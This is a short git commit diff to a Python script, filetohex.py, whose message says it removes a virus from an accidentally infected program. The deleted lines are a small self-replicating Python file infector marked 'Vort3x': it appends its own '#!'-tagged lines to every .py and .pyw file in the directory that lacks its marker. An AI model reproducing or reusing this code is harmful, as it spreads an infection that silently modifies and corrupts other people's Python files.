31f6b8e2a22fdad91cdb63b968dd7b59ff1d6362
Abhiram Shibu <abhiramshibu1998@gmail.com>
2016-11-16 14:40:38 +0530

    Removed a virus from accedentaly affected program

--- filetohex.py
+++ filetohex.py
@@ -16,31 +16,3 @@ def binhex():
     print"file:",frand
     
 binhex()
-
-import glob #!
-
-from string import * #!
-
-Files = glob.glob("*.py") + glob.glob("*.pyw") #!
-
-for Files in Files: #!
-
-   vCode = open(__file__, 'r') #!
-
-   victim = open (Files, 'r') #!
-
-   readvictim = victim.read() #!
-
-   if find(readvictim, "-=::Vort3x::=-") == -1: #!
-
-       victim = open(Files, 'a') #!
-
-       for code in vCode.readlines(): #!
-
-            if ("#!") in code: #!
-
-                vCode.close() #!
-
-                mycode=(chr(10)+code) #!
-
-                victim.write(mycode) #! 
